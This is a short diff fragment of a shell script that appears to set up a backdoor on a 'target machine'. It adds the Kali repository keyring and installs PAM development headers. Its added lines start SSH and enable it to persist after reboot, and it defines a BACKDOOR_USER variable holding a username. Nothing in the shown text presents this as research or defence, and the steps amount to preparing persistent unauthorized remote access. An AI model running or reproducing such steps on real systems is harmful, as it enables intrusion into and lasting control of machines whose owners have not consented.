@@ -5,7 +5,11 @@ sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/ka
 sudo apt update -y
 sudo apt install libpam0g-dev
 
+# On the target machine (locally or via console):
+sudo systemctl start ssh
 
+# To make it persist after reboot:
+sudo systemctl enable ssh
 
 
 BACKDOOR_USER="nihargayam"
